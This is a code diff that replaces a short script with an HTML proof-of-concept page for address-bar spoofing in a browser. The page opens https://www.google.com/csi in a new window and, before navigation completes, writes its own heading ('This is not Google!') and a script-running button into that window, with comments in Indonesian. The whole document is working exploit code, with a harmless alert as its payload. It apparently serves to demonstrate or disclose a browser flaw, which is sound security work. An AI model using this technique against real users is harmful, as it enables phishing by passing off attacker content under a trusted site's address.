@@ -1,8 +1,26 @@
-<script>
-    window.onclick = function () {
-        x = window.open('https://www.google.com/csi');
-        setTimeout(function () {
-            x.document.write(`I am not a www.google.com;<button onclick="alert('I can run JS on this page!')">click me</button>`)
-        }, 100);
-    }
-</script>
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
+
+    <script>
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com/csi", "_blank");
+
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+              <h1>This is not Google!</h1>
+              <button onclick="alert('XSS on spoofed page')">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
+</html>
